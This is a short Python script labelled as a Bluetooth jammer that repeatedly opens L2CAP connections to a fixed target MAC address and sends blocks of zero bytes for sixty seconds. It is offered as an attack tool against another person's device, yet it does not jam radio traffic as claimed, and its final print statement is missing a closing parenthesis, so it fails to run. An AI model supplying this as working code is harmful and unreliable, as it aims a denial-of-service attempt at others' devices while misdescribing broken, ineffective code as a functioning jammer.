import bluetooth
import time

# Target Bluetooth device's MAC address
target_device = "00:11:22:33:44:55"

# Jamming parameters
jamming_duration = 60  # in seconds
jamming_interval = 1   # in seconds

# Start Bluetooth jamming
print("Starting Bluetooth jamming...")
start_time = time.time()

while time.time() - start_time < jamming_duration:
    try:
        # Send a special packet to the target device
        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        sock.connect((target_device, 1))
        sock.send(b"\x00" * 1024)  # Send a large packet of zeros
        sock.close()

        print("Jammed a packet to:", target_device)
        time.sleep(jamming_interval)
    except Exception as e:
        print("Error:", e)
        break

print("Bluetooth jamming completed."
